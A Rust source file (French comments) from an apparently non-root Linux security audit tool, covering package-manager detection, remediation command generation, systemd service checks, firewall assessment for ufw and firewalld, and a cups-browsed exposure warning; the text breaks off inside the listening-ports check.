//! Audit de sécurité Linux (Arch/Omarchy), sans privilèges root.

// Le programme sous Linux : ses parties Windows ne sont pas encore relues, et les essais en sont exemptés
// (y déborder fait échouer l'essai). L'en-tête vaut aussi pour les sous-modules.
#![cfg_attr(
    all(target_os = "linux", not(test)),
    warn(clippy::arithmetic_side_effects, clippy::as_conversions)
)]

use std::collections::HashMap;
use std::fmt::Write;
use std::path::{Path, PathBuf};
use std::process::Command;

use super::sshd::{mots_de_passe_sshd, mots_de_passe_vides_sshd, valeur_sshd};
use super::unix::configuration_sshd;
use super::{Audit, Constat, alerte, cles_ssh, impossible, ok, sortie};
use crate::machine::gestes_unix::{self, ActionUnite, Defense, GesteUnix};
use crate::optimiser::Geste;
use crate::risk::{Niveau, info_port};
use crate::{tr, trf, trw};

mod algorithmes_ssh;
pub(crate) mod cache_pacman;
pub(crate) mod connexions;
#[cfg(test)]
pub(crate) mod corpus;
pub(crate) mod couper;
mod croisees;
pub(crate) mod dbus;
pub(crate) mod dconf;
pub(crate) mod designes;
pub(crate) mod dissimulation;
mod docker;
pub(crate) mod docker_api;
mod dpkg_verifier;
mod durcissement;
pub(crate) mod ecoute;
pub(crate) mod fanotify;
pub(crate) mod garde;
pub(crate) mod gvdb;
pub(crate) mod http_unix;
pub(crate) mod isolement;
pub(crate) mod journal_systemd;
mod maj;
pub(crate) mod natif;
pub(crate) mod netlink;
pub(crate) mod networkmanager;
pub(crate) mod nftables;
pub(crate) mod paquets;
mod persistance;
mod plateforme;
mod privileges;
// Partagé avec les gestes de défense de l'assistant élevé (`machine::defense_eleve`).
pub(crate) use privileges::DOSSIERS_DE_ROOT;
mod regles;
pub(crate) mod reseau_natif;
pub(crate) mod unites;
pub(crate) mod veilleur;
// Le temps réel des fichiers du veilleur, hors de veilleur.rs : il refuse l'`unsafe`, que veilleur.rs lève.
pub(crate) mod veilleur_fichiers;
pub(crate) mod zstd;

pub(crate) use algorithmes_ssh::{liste_sure, sshd_dans_l_ordre, sshd_en_marche, version_ssh, version_sshd};
use docker::*;
use durcissement::*;
pub(crate) use durcissement::{SYSCTL_VANGUARD, cle_durcie, valeur_durcie};
pub use maj::mises_a_jour_completes;

/// Les CVE qui touchent les paquets de cet ordinateur (Arch) : pour marquer les dernières failles exploitées.
pub(crate) fn cves_installees() -> Option<std::collections::HashSet<String>> {
    maj::cves_des_paquets()
}

/// Un assistant AUR (yay, paru) est là, mais l'accord d'envoyer les noms des paquets à l'AUR n'est pas donné
/// (Paramètres) : leurs mises à jour ne sont pas cherchées, et `mises-a-jour --json` le dit non vérifié.
pub(crate) fn aur_sans_accord() -> bool {
    ["yay", "paru"].into_iter().any(natif::present) && !crate::parametres::paquets_aur()
}
use maj::*;
use persistance::*;
// La liste des dossiers d'unités du compte, partagée avec `vanguard demarrage` (relecture 0.94, C-1).
pub(crate) use persistance::{
    complement_change_le_lancement, complements_d_unite, dossiers_d_unites_du_compte, exec_start_effectif, noms_d_unite,
};
use privileges::*;

/// Ajouts de Vanguard à la configuration de sshd (lu en premier : sshd garde la première valeur trouvée).
pub(crate) const SSHD_VANGUARD: &str = "/etc/ssh/sshd_config.d/00-vanguard.conf";
pub const NOM: &str = "Linux";

/// Omarchy installé : ses outils de mise à jour et d'installation passent avant pacman (instantané, migrations,
/// vérifications). Sur un Arch pur, on garde pacman.
pub fn omarchy() -> bool {
    Path::new("/usr/bin/omarchy").exists()
}

/// Commande pour installer un outil manquant sur cette distribution (texte d'aide).
pub fn commande_installation(paquet: &str) -> String {
    match Paquets::detecter() {
        Some(g) => g.installer(paquet),
        None => trf!(
            "installez « {paquet} » avec votre distribution",
            "install “{paquet}” with your distribution"
        ),
    }
}

/// Ubuntu ou une dérivée (Mint, Pop!_OS, Zorin…) : quelques paquets n'y ont pas le nom de Debian.
pub fn famille_ubuntu() -> bool {
    crate::socle::systeme::os_release()
        .lines()
        .filter(|l| l.starts_with("ID=") || l.starts_with("ID_LIKE="))
        .any(|l| l.split(['=', '"', '\'', ' ']).any(|id| id == "ubuntu"))
}

/// Système « atomique » : racine en lecture seule, mises à jour par image complète. dnf ou zypper n'y installent
/// rien ; chacun a son outil, appliqué au prochain redémarrage.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Atomique {
    /// Fedora Silverblue/Kinoite, Bazzite, Bluefin, Aurora.
    RpmOstree,
    /// openSUSE Aeon, Kalpa, MicroOS.
    Transactionnel,
}

pub fn atomique() -> Option<Atomique> {
    if Path::new("/run/ostree-booted").exists() && Path::new("/usr/bin/rpm-ostree").exists() {
        return Some(Atomique::RpmOstree);
    }
    let racine = crate::socle::lire_texte("/proc/mounts").unwrap_or_default();
    (Path::new("/usr/sbin/transactional-update").exists() && racine_lecture_seule(&racine))
        .then_some(Atomique::Transactionnel)
}

/// La racine est-elle montée en lecture seule ? (ligne « /dev/… / btrfs ro,… » de /proc/mounts)
fn racine_lecture_seule(mounts: &str) -> bool {
    mounts
        .lines()
        .rev()
        .find_map(|l| {
            let c: Vec<&str> = l.split_whitespace().collect();
            (c.get(1) == Some(&"/")).then(|| c.get(3).copied().unwrap_or(""))
        })
        .is_some_and(|options| options.split(',').any(|o| o == "ro"))
}

/// Famille de la distribution d'après /etc/os-release : ID, puis ID_LIKE pour les dérivées (Mint et Pop!_OS
/// → ubuntu, Manjaro et CachyOS → arch, Nobara et Rocky → fedora…).
fn famille(os_release: &str) -> Option<Paquets> {
    let valeur = |cle: &str| {
        os_release
            .lines()
            .find_map(|l| l.strip_prefix(cle)?.strip_prefix('='))
            .map_or_default(|v| v.trim().trim_matches('"').to_lowercase())
    };
    format!("{} {}", valeur("ID"), valeur("ID_LIKE"))
        .split_whitespace()
        .find_map(|id| match id {
            "arch" | "archarm" => Some(Paquets::Pacman),
            "debian" | "ubuntu" => Some(Paquets::Apt),
            "fedora" | "rhel" | "centos" => Some(Paquets::Dnf),
            "suse" | "sles" => Some(Paquets::Zypper),
            id if id.starts_with("opensuse") => Some(Paquets::Zypper),
            _ => None,
        })
}

/// Gestionnaire de paquets de la distribution : Arch, Debian/Ubuntu/Mint, Fedora, openSUSE.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Paquets {
    Pacman,
    Apt,
    Dnf,
    Zypper,
}

impl Paquets {
    /// La distribution d'abord (os-release), confirmée par la présence de son outil ; sinon le premier outil
    /// trouvé, pour une distribution que l'on ne connaît pas.
    pub fn detecter() -> Option<Self> {
        let present = |c: &str| {
            ["/usr/bin", "/bin", "/usr/sbin"]
                .iter()
                .any(|d| Path::new(d).join(c).exists())
        };
        let outil = |p: Paquets| match p {
            Paquets::Pacman => present("pacman"),
            Paquets::Apt => present("apt-get"),
            // Les Fedora atomiques n'ont pas toujours dnf : rpm-ostree le remplace.
            Paquets::Dnf => present("dnf") || present("rpm-ostree"),
            Paquets::Zypper => present("zypper"),
        };
        if let Some(p) = famille(crate::socle::systeme::os_release()).filter(|&p| outil(p)) {
            return Some(p);
        }
        [
            ("pacman", Paquets::Pacman),
            ("apt-get", Paquets::Apt),
            ("dnf", Paquets::Dnf),
            ("zypper", Paquets::Zypper),
        ]
        .into_iter()
        .find_map(|(c, p)| present(c).then_some(p))
    }

    /// Commande d'installation non interactive. Sous Omarchy, son propre outil (il vérifie ensuite que chaque paquet
    /// est bien là) ; sur un Arch pur, pacman. Sur un système atomique, l'ajout se fait à l'image suivante.
    pub fn installer(self, paquets: &str) -> String {
        let image = match (self, atomique()) {
            (Paquets::Dnf, Some(Atomique::RpmOstree)) => Some("sudo rpm-ostree install --idempotent"),
            (Paquets::Zypper, Some(Atomique::Transactionnel)) => {
                Some("sudo transactional-update --non-interactive pkg install")
            }
            _ => None,
        };
        if let Some(outil) = image {
            return format!(
                "{outil} {paquets} && echo \"{}\"",
                tr!("Redémarrez pour l'utiliser.", "Reboot to use it.")
            );
        }
        match self {
            Paquets::Pacman if omarchy() => format!("omarchy pkg add {paquets}"),
            Paquets::Pacman => format!("sudo pacman -S --needed --noconfirm {paquets}"),
            Paquets::Apt => format!("sudo apt-get install -y {paquets}"),
            Paquets::Dnf => format!("sudo dnf install -y {paquets}"),
            Paquets::Zypper => format!("sudo zypper --non-interactive install {paquets}"),
        }
    }

    /// Le fichier appartient-il à un paquet ? (sinon : ajouté à la main)
    pub fn possede(self, fichier: &Path) -> bool {
        self.proprietaire(fichier).is_some()
    }

    /// Nom du paquet qui a installé ce fichier, `None` s'il a été ajouté à la main.
    pub fn proprietaire(self, fichier: &Path) -> Option<String> {
        self.proprietaires(&[fichier.to_path_buf()]).pop().flatten()
    }

    /// Le secours, quand la base du gestionnaire ne se lit pas directement : sa commande, un fichier à la fois.
    fn proprietaire_par_commande(self, fichier: &Path) -> Option<String> {
        let nom = |f: &Path| {
            let arg = f.to_string_lossy();
            match self {
                Paquets::Pacman => sortie("pacman", &["-Qoq", &arg]).map(|s| s.trim().to_string()),
                // En anglais : dpkg traduit les lignes « diversion by … » que paquet_dpkg écarte.
                Paquets::Apt => {
                    crate::commande::lancer_en_anglais(crate::commande::par_le_systeme("dpkg").args(["-S", &*arg]), 30)
                        .filter(|r| r.code == Some(0))
                        .and_then(|r| paquet_dpkg(&r.sortie))
                }
                Paquets::Dnf | Paquets::Zypper => sortie("rpm", &["-qf", "--qf", "%{NAME}\\n", &arg])
                    .and_then(|s| s.lines().next().map(str::to_string)),
            }
            .filter(|n| !n.is_empty())
        };
        // /bin, /sbin et /lib sont fusionnés dans /usr sur Debian, Ubuntu et Mint, mais dpkg garde souvent
        // l'ancien chemin : /usr/bin/fusermount3 y est enregistré comme /bin/fusermount3 (vu sur Mint 22).
        nom(fichier).or_else(|| chemin_hors_usr(fichier).and_then(|ancien| nom(&ancien)))
    }

    /// Le paquet de chaque fichier, dans l'ordre. Les listes de fichiers de pacman et de dpkg se lisent
    /// directement, en un seul passage pour tous ; rpm garde sa commande (sa base est en SQLite). Les commandes ne
    /// servent qu'en secours, quand la base ne se lit pas.
    pub fn proprietaires(self, fichiers: &[std::path::PathBuf]) -> Vec<Option<String>> {
        let lire: Option<fn(&[&Path]) -> Proprietaires> = match self {
            Paquets::Pacman => Some(natif::proprietaire_pacman),
            Paquets::Apt => Some(proprietaire_dpkg),
            Paquets::Dnf | Paquets::Zypper => None,
        };
        if let Some(trouves) = lire.and_then(|l| proprietaires_selon(fichiers, l)) {
            return trouves;
        }
        // pacman répond pour tous en un appel (un par fichier coûtait une seconde pour les programmes privilégiés).
        if self == Paquets::Pacman && !fichiers.is_empty() {
            // Code 1 dès qu'un fichier n'a pas de paquet : la sortie vaut quand même pour les autres.
            if let Some(r) = crate::commande::lancer_en_anglais(
                crate::commande::par_le_systeme("pacman").arg("-Qo").args(fichiers),
                60,
            ) {
                let trouves = proprietaires_pacman(&r.sortie);
                return fichiers
                    .iter()
                    .map(|f| trouves.get(f.to_string_lossy().as_ref()).cloned())
                    .collect();
            }
        }
        fichiers.iter().map(|f| self.proprietaire_par_commande(f)).collect()
    }

    /// Ces fichiers du paquet ont-ils changé depuis son installation ? Contenu comparé à l'empreinte enregistrée
    /// par le gestionnaire de paquets. `None` pour un fichier qu'on ne peut pas vérifier (illisible, sans empreinte).
    pub fn modifies(self, paquet: &str, fichiers: &[std::path::PathBuf]) -> Vec<Option<bool>> {
        match self {
            Paquets::Pacman => {
                // Empreintes SHA-256 dans le mtree du paquet : ne calcule que les fichiers demandés
                // (pacman -Qkk relirait tout le paquet, des centaines de Mo pour Electron).
                let mtree = mtree_pacman(paquet);
                fichiers
                    .iter()
                    .map(|f| {
                        let attendue = empreinte_mtree(mtree.as_deref()?, f)?;
                        let calculee = crate::traces::sha256_de(std::fs::File::open(f).ok()?).ok()?;
                        Some(calculee != attendue)
                    })
                    .collect()
            }
            // Les empreintes de la base de dpkg (md5sums et conffiles), lues par Vanguard ; dpkg --verify si elle ne
            // se lit pas ici.
            Paquets::Apt if let Some(e) = dpkg_verifier::empreintes(Path::new(dpkg_verifier::BASE), paquet) => fichiers
                .iter()
                .map(|f| dpkg_verifier::modifie(&e, f, chemin_hors_usr(f).as_deref()))
                .collect(),
            Paquets::Apt | Paquets::Dnf | Paquets::Zypper => {
                // dpkg --verify et rpm -V répondent 1 quand ils trouvent une différence : c'est une réponse, pas une erreur.
                let (outil, option) = if self == Paquets::Apt {
                    ("dpkg", "--verify")
                } else {
                    ("rpm", "-V")
                };
                // Par son chemin et dans un environnement vidé : un faux rpm du compte dirait « rien n'a changé ».
                let verif = crate::commande::outil_propre(outil)
                    .and_then(|mut c| crate::commande::lancer(c.args([option, paquet]).env("LC_ALL", "C"), 60))
                    .filter(|r| matches!(r.code, Some(0 | 1)))
                    .map(|r| r.sortie);
                fichiers
                    .iter()
                    .map(|f| {
                        let verif = verif.as_deref()?;
                        let ancien = chemin_hors_usr(f);
                        Some(contenu_modifie(verif, f) || ancien.is_some_and(|a| contenu_modifie(verif, &a)))
                    })
                    .collect()
            }
        }
    }

    /// Commande de retrait non interactive, avec ce que le paquet seul exigeait. Sous Omarchy, son outil (il ne
    /// touche pas à un paquet absent) ; sur un système atomique, le retrait d'un paquet superposé se fait à l'image
    /// suivante.
    pub fn retirer(self, paquets: &str) -> String {
        self.commande_retrait(omarchy(), atomique(), paquets)
    }

    fn commande_retrait(self, omarchy: bool, atomique: Option<Atomique>, paquets: &str) -> String {
        let image = match (self, atomique) {
            (Paquets::Dnf, Some(Atomique::RpmOstree)) => Some("sudo rpm-ostree uninstall"),
            (Paquets::Zypper, Some(Atomique::Transactionnel)) => {
                Some("sudo transactional-update --non-interactive pkg remove")
            }
            _ => None,
        };
        if let Some(outil) = image {
            return format!(
                "{outil} {paquets} && echo \"{}\"",
                tr!(
                    "Redémarrez pour que le retrait prenne effet.",
                    "Reboot for the removal to take effect."
                )
            );
        }
        match self {
            Paquets::Pacman if omarchy => format!("omarchy pkg drop {paquets}"),
            Paquets::Pacman => format!("sudo pacman -Rns --noconfirm {paquets}"),
            Paquets::Apt => format!("sudo apt-get remove -y {paquets}"),
            Paquets::Dnf => format!("sudo dnf remove -y {paquets}"),
            Paquets::Zypper => format!("sudo zypper --non-interactive remove {paquets}"),
        }
    }

    /// Commande pour remettre les fichiers d'origine d'un paquet.
    pub fn reinstaller(self, paquet: &str) -> String {
        match self {
            Paquets::Pacman => format!("sudo pacman -S --noconfirm {paquet}"),
            Paquets::Apt => format!("sudo apt-get install --reinstall -y {paquet}"),
            Paquets::Dnf => format!("sudo dnf reinstall -y {paquet}"),
            Paquets::Zypper => format!("sudo zypper --non-interactive install -f {paquet}"),
        }
    }

    /// Commande de mise à jour complète : l'outil propre à la distribution quand elle en a un (Omarchy,
    /// Universal Blue), l'image suivante sur un système atomique, sinon le gestionnaire de paquets.
    pub(crate) fn mise_a_jour(self) -> &'static str {
        match (self, atomique()) {
            // Bazzite, Bluefin, Aurora : met aussi à jour les Flatpak et les conteneurs.
            (Paquets::Dnf, Some(Atomique::RpmOstree)) if Path::new("/usr/bin/ujust").exists() => return "ujust update",
            (Paquets::Dnf, Some(Atomique::RpmOstree)) => return "sudo rpm-ostree upgrade",
            (Paquets::Zypper, Some(Atomique::Transactionnel)) => {
                return "sudo transactional-update --non-interactive dup";
            }
            _ => {}
        }
        match self {
            Paquets::Pacman if omarchy() => "omarchy update",
            Paquets::Pacman => "sudo pacman -Syu --noconfirm",
            Paquets::Apt => "sudo apt-get update && sudo apt-get full-upgrade -y",
            Paquets::Dnf => "sudo dnf upgrade -y",
            Paquets::Zypper => "sudo zypper --non-interactive update",
        }
    }
}

/// systemd est-il le gestionnaire de services ? Sans lui (conteneur, Alpine, Void…), on ne peut pas
/// savoir quels services tournent : on le dit au lieu de conclure.
fn systemd() -> bool {
    Path::new("/run/systemd/system").is_dir()
}

/// L'unité tourne-t-elle ? `None` : son état n'a pu se lire ni par le bus ni par systemctl (`services_systemd_actifs`).
pub(crate) fn service_actif(nom: &str) -> Option<bool> {
    services_systemd_actifs(&[nom]).first().copied().flatten()
}

/// Au moins une des unités tourne-t-elle ? `Some(true)` dès qu'une est lue active, `Some(false)` quand toutes sont
/// lues arrêtées, `None` sinon : une unité non lue peut être celle qui tourne.
pub(crate) fn un_service_actif(noms: &[&str]) -> Option<bool> {
    une_lue_active(&services_systemd_actifs(noms))
}

fn une_lue_active(etats: &[Option<bool>]) -> Option<bool> {
    if etats.contains(&Some(true)) {
        Some(true)
    } else if etats.contains(&None) {
        None
    } else {
        Some(false)
    }
}

/// Les trois états où `systemctl is-active` répond 0 (systemctl-is-active.c).
fn etat_actif(etat: &str) -> bool {
    matches!(etat, "active" | "reloading" | "refreshing")
}

/// Chaque unité tourne-t-elle, comme le code de retour de `systemctl is-active` le dirait (« active », « reloading »
/// ou « refreshing ») ? L'état d'activité de systemd, lu sur un seul bus pour toutes : une unité « oneshot » qui reste
/// active sans processus (ufw, nftables) et une prise d'écoute (ssh.socket) y sont actives, ce que les groupes de
/// contrôle ne diraient pas. Sans bus, ou sur une erreur pour un nom, `systemctl is-active` en secours (celui du
/// système, jamais celui du PATH du compte, dans un environnement propre) ; `None` quand lui non plus ne répond pas :
/// un état non lu n'est jamais pris pour « arrêté », qui ferait dire « serveur SSH désactivé » ou « aucun pare-feu ».
pub(crate) fn services_systemd_actifs(noms: &[&str]) -> Vec<Option<bool>> {
    let mut bus = dbus::Bus::systeme().ok();
    etats_des_services(
        noms,
        |nom| {
            let e = dbus::etat_d_activite(bus.as_mut()?, nom).ok()?;
            Some(e.as_deref().is_some_and(etat_actif))
        },
        systemctl_is_active,
    )
}

/// Le bus d'abord, nom par nom ; les noms qu'il n'a pas lus vont tous ensemble au secours.
fn etats_des_services(
    noms: &[&str],
    mut par_le_bus: impl FnMut(&str) -> Option<bool>,
    secours: impl FnOnce(&[&str]) -> Vec<Option<bool>>,
) -> Vec<Option<bool>> {
    let mut etats: Vec<Option<bool>> = noms.iter().map(|n| par_le_bus(n)).collect();
    let manquants: Vec<&str> = noms
        .iter()
        .zip(&etats)
        .filter(|(_, e)| e.is_none())
        .map(|(n, _)| *n)
        .collect();
    if manquants.is_empty() {
        return etats;
    }
    let mut repris = secours(&manquants).into_iter();
    for e in etats.iter_mut().filter(|e| e.is_none()) {
        *e = repris.next().flatten();
    }
    etats
}

/// `systemctl is-active -- <noms>` : une ligne par unité, dans l'ordre. 0 (une au moins active), 3 (aucune) ou 4
/// (unité inconnue) avec autant de lignes que de noms : lu ; tout autre cas (systemd injoignable, 1) : rien de lu.
fn systemctl_is_active(noms: &[&str]) -> Vec<Option<bool>> {
    let lu = crate::commande::outil_propre("systemctl")
        .and_then(|mut c| crate::commande::lancer(c.arg("is-active").arg("--").args(noms), 10))
        .and_then(|r| lire_is_active(r.code, &r.sortie, noms.len()));
    lu.unwrap_or_else(|| vec![None; noms.len()])
}

fn lire_is_active(code: Option<i32>, sortie: &str, n: usize) -> Option<Vec<Option<bool>>> {
    if !matches!(code, Some(0 | 3 | 4)) {
        return None;
    }
    let etats: Vec<Option<bool>> = sortie.lines().map(|l| Some(etat_actif(l.trim()))).collect();
    (etats.len() == n).then_some(etats)
}

fn home() -> String {
    crate::socle::maison().to_string_lossy().into_owned()
}

/// Politique d'entrée par défaut de ufw (ACCEPT, DROP ou REJECT), lue dans /etc/default/ufw.
pub(crate) fn politique_ufw(texte: &str) -> Option<String> {
    texte.lines().find_map(|l| {
        let v = l.trim().strip_prefix("DEFAULT_INPUT_POLICY=")?;
        Some(v.trim_matches('"').to_ascii_uppercase())
    })
}

/// ufw est-il le pare-feu actif ? (les corrections « ufw deny » n'ont de sens qu'avec lui) ; un état non lu ne l'est
/// pas.
pub(crate) fn ufw_actif() -> bool {
    ufw_active_dans_sa_configuration() && service_actif("ufw") == Some(true)
}

fn ufw_active_dans_sa_configuration() -> bool {
    std::fs::read_to_string("/etc/ufw/ufw.conf").is_ok_and(|c| c.lines().any(|l| l.trim() == "ENABLED=yes"))
}

/// La zone par défaut de firewalld : « DefaultZone= » de sa configuration, que « --set-default-zone » réécrit ;
/// celle de /etc l'emporte sur celle du paquet. firewall-cmd seulement si aucune ne la donne.
fn zone_firewalld() -> Option<String> {
    ["/etc/firewalld/firewalld.conf", "/usr/lib/firewalld/firewalld.conf"]
        .iter()
        .find_map(|f| zone_par_defaut(&std::fs::read_to_string(f).ok()?))
        .or_else(|| sortie("firewall-cmd", &["--get-default-zone"]).map(|z| z.trim().to_string()))
}

/// « DefaultZone=public » (la dernière ligne l'emporte) ; une valeur vide ne dit rien.
fn zone_par_defaut(conf: &str) -> Option<String> {
    conf.lines()
        .filter_map(|l| l.trim().strip_prefix("DefaultZone=").map(str::trim))
        .next_back()
        .filter(|z| !z.is_empty())
        .map(str::to_string)
}

/// La date de la coupure de `p` par les Options de défense, si sa note est là.
/// Les pare-feu coupés par la personne (leur note est là) : une information, jamais « sain » ni une correction faite
/// d'office ; « Rallumer » est proposé pour chacun (P9). Les ports ouverts restent dits sans pare-feu (le constat a un
/// niveau). nftables : sans droits root, seule la note le dit, et c'est écrit.
fn par_votre_choix(coupes: &[(crate::machine::gestes_unix::PareFeu, u64)]) -> Constat {
    use crate::machine::gestes_unix::PareFeu;
    let noms: Vec<String> = coupes
        .iter()
        .map(|&(p, date)| {
            let date = crate::machine::choix_avant::date_note(date);
            let nom = p.mot();
            if p == PareFeu::Nftables {
                trf!(
                    "{nom} : coupé par votre choix le {date} (d'après la note de Vanguard ; Couper ou Rallumer la met à jour)",
                    "{nom}: turned off by your choice on {date} (according to Vanguard's note; Turn off or Turn back on updates it)"
                )
            } else {
                trf!(
                    "{nom} : coupé par votre choix le {date}",
                    "{nom}: turned off by your choice on {date}"
                )
            }
        })
        .collect();
    let commandes: Vec<String> = coupes
        .iter()
        .map(|&(p, _)| crate::options_defense::linux::commande_rallumer(p))
        .collect();
    let commandes: Vec<&str> = commandes.iter().map(String::as_str).collect();
    alerte(
        "Pare-feu",
        Niveau::Info,
        trf!(
            "Pare-feu {}. Tout service ouvert est joignable depuis le réseau. Si ce n'est pas vous : Rallumer.",
            "Firewall {}. Every open service can be reached from the network. If it was not you: Turn back on.",
            noms.join(" ; ")
        ),
    )
    .manuel(
        tr!(
            "Rallumer (Options de défense), si ce n'est pas vous qui l'avez coupé",
            "Turn back on (Defense options), if you did not turn it off"
        ),
        &commandes,
    )
}

fn pare_feu() -> Constat {
    const SERVICES: [&str; 5] = ["ufw", "firewalld", "nftables", "iptables", "ip6tables"];
    if !systemd() {
        return impossible("Pare-feu", tr!("systemd absent", "systemd missing"));
    }
    // Un seul état non lu, et « aucun pare-feu » (avec ufw à activer par-dessus firewalld) pourrait être faux.
    let etats = services_systemd_actifs(&SERVICES);
    if etats.contains(&None) {
        return impossible(
            "Pare-feu",
            tr!(
                "état des services non lu (ni le bus système ni systemctl n'ont répondu)",
                "service state not read (neither the system bus nor systemctl answered)"
            ),
        );
    }
    let actif = |nom: &str| SERVICES.iter().zip(&etats).any(|(n, e)| *n == nom && *e == Some(true));
    let coupes = crate::options_defense::linux::coupes_par_choix();
    if ufw_active_dans_sa_configuration() && actif("ufw") {
        // Actif ne suffit pas : encore faut-il qu'il bloque les connexions entrantes par défaut.
        let politique = std::fs::read_to_string("/etc/default/ufw")
            .ok()
            .and_then(|t| politique_ufw(&t));
        match politique.as_deref() {
            Some("ACCEPT") => alerte(
                "Pare-feu",
                Niveau::Eleve,
                tr!(
                    "ufw est actif mais accepte toutes les connexions entrantes par défaut : il ne protège rien.",
                    "ufw is running but accepts all incoming connections by default: it protects nothing."
                ),
            )
            .corriger(
                tr!(
                    "Bloquer par défaut les connexions entrantes",
                    "Block incoming connections by default"
                ),
                &["sudo ufw default deny incoming"],
            )
            .protection(),
            Some(p) => ok(
                "Pare-feu",
                trf!(
                    "ufw est actif, entrées refusées par défaut ({p}).",
                    "ufw is running, incoming refused by default ({p})."
                ),
            ),
            None => ok("Pare-feu", tr!("ufw est actif.", "ufw is running.")),
        }
    } else if actif("firewalld") {
        // La zone « trusted » laisse tout passer.
        match zone_firewalld() {
            Some(z) if z == "trusted" => alerte(
                "Pare-feu",
                Niveau::Eleve,
                tr!(
                    "firewalld est actif mais en zone « trusted » : tout est accepté.",
                    "firewalld is running but in the “trusted” zone: everything is accepted."
                ),
            )
            .corriger(
                tr!(
                    "Passer la zone par défaut en « public »",
                    "Set the default zone to “public”"
                ),
                &["sudo firewall-cmd --set-default-zone=public"],
            )
            .protection(),
            Some(z) => ok(
                "Pare-feu",
                trf!(
                    "firewalld est actif (zone « {z} »).",
                    "firewalld is running (zone “{z}”)."
                ),
            ),
            None => ok("Pare-feu", tr!("firewalld est actif.", "firewalld is running.")),
        }
    } else if coupes
        .iter()
        .any(|(p, _)| *p == crate::machine::gestes_unix::PareFeu::Nftables)
    {
        // Couper nftables vide ses règles sans arrêter son service (toujours « active ») : la note seule le dit.
        par_votre_choix(&coupes)
    } else if let Some(s) = ["nftables", "iptables", "ip6tables"].into_iter().find(|s| actif(s)) {
        ok(
            "Pare-feu",
            trf!(
                "{s} est actif (règles non lisibles sans droits root).",
                "{s} is running (rules not readable without root rights)."
            ),
        )
    } else if !coupes.is_empty() {
        par_votre_choix(&coupes)
    } else {
        let installer_ufw = match Paquets::detecter() {
            Some(g) => g.installer("ufw"),
            None => String::from(tr!(
                "echo 'Installez ufw avec votre distribution'",
                "echo 'Install ufw with your distribution'"
            )),
        };
        alerte(
            "Pare-feu",
            Niveau::Eleve,
            tr!(
                "Aucun pare-feu actif : tout service ouvert est joignable depuis le réseau.",
                "No firewall running: every open service can be reached from the network."
            ),
        )
        .corriger(
            tr!(
                "Activer ufw : bloquer les connexions entrantes, autoriser les sortantes",
                "Turn ufw on: block incoming connections, allow outgoing ones"
            ),
            // Lot U3 : le « systemctl » reste une commande, mêlé ici aux commandes d'ufw ; il passera au geste « unite »
            // avec elles (U6).
            &[
                &format!("command -v ufw >/dev/null || {installer_ufw}"),
                "sudo ufw default deny incoming",
                "sudo ufw default allow outgoing",
                "sudo ufw --force enable",
                "sudo systemctl enable --now ufw",
            ],
        )
        .protection()
    }
}

/// Adresses joignables depuis un autre appareil : celles des vraies interfaces (Wi-Fi, Ethernet, VPN),
/// au format de `ss` (IPv6 entre crochets). Les ponts virtuels (Docker, libvirt…) ne sont joignables
/// que depuis cette machine.
pub(super) fn adresses_exposees() -> std::collections::HashSet<String> {
    let virtuelle = |nom: &str| {
        [
            "lo", "docker", "br-", "virbr", "veth", "podman", "lxc", "lxdbr", "incusbr", "waydroid", "vnet",
        ]
        .iter()
        .any(|p| nom.starts_with(p))
    };
    if_addrs::get_if_addrs()
        .into_iter()
        .flatten()
        .filter(|i| !virtuelle(&i.name) && !i.addr.ip().is_loopback())
        .map(|i| match i.addr.ip() {
            std::net::IpAddr::V4(ip) => ip.to_string(),
            std::net::IpAddr::V6(ip) => format!("[{ip}]"),
        })
        .collect()
}

/// Une prise joignable depuis un autre appareil, comme dans « Ports en écoute » : toutes les adresses, ou celle d'une
/// vraie interface (pas un pont Docker) ; ni le client DHCP ni une prise UDP éphémère anonyme.
pub(super) fn prise_exposee(p: &ecoute::Ecoute, adresses: &std::collections::HashSet<String>) -> bool {
    let bruit = p.udp && (p.port == 68 || (p.port >= 32768 && info_port(p.port).service == crate::risk::inconnu()));
    (p.adresse.is_unspecified() || adresses.contains(&p.adresse_ss())) && !bruit
}

/// Service systemd d'un groupe de contrôle (« /system.slice/passim.service » → « passim »), prêt à montrer : le
/// nom d'un service de l'utilisateur est le sien.
pub(crate) fn service_du_groupe(groupe: &str) -> Option<String> {
    let unite = groupe.rsplit('/').next()?;
    let nom = unite.strip_suffix(".service")?;
    // Une session (« session-2.scope ») ou une app de l'utilisateur ne dit rien de plus que « programme inconnu ».
    (!nom.is_empty()).then(|| crate::ui::affichable(nom))
}

/// cups-browsed qui écoute 631/udp : la faille de 2024 (CVE-2024-47176 et suivantes) laissait n'importe qui sur le
/// réseau, ou depuis Internet sans pare-feu, ajouter une fausse imprimante qui lance une commande à la première
/// impression. Il ne sert qu'à trouver de vieilles imprimantes partagées : CUPS trouve les récentes sans lui.
fn cups_browsed_expose() -> Constat {
    alerte(
        "Ports en écoute",
        Niveau::Eleve,
        tr!(
            "631/udp ouvert par cups-browsed : une faille de 2024 lui faisait ajouter une fausse imprimante, envoyée par n'importe qui sur le réseau, qui lance une commande à la première impression.",
            "631/udp opened by cups-browsed: a 2024 flaw made it add a fake printer, sent by anyone on the network, that runs a command at the first print."
        ),
    )
    .corriger(
        tr!(
            "Arrêter et désactiver cups-browsed (les imprimantes récentes restent trouvées par CUPS)",
            "Stop and disable cups-browsed (recent printers are still found by CUPS)"
        ),
        // Le geste fait par l'assistant élevé, par le bus système (lot U3) : ni shell ni « sudo » écrit en texte.
        &[GesteUnix::Unite(ActionUnite::Desactiver, &gestes_unix::CUPS_BROWSED)
            .ligne()
            .as_str()],
    )
    .annulable(vec![Geste::unite("cups-browsed")])
}

/// Services qui écoutent sur le réseau (pas seulement en local), en TCP et en UDP.
/// `ufw` : le pare-feu actif est ufw. Avec firewalld ou nftables, « ufw deny » ne bloquerait rien
/// (ou s'ajouterait à un ufw arrêté) tout en s'affichant « fait » : on ne le propose pas.
fn ports_ecoute(pare_feu_actif: bool, ufw: bool) -> Vec<Constat> {
    let adresses = adresses_exposees();
    let mut constats = Vec::new();
    let mut vus = std::collections::HashSet::new();
    let mut deja_conseille = std::collections::HashSet::new();
    let bloques = super::ports_bloques();
    // Le groupe de contrôle de chaque prise (« /system.slice/passim.service ») nomme le service même quand le
    // programme, lancé par root ou un compte système, reste invisible sans droits admin (voir ecoute.rs).
    let Some(prises) = ecoute::prises_ou_ss() else {
        return vec![alerte(
            "Ports en écoute",
            Niveau::Info,
            tr!("Commande ss indisponible.", "ss command unavailable."),
        )];
    };
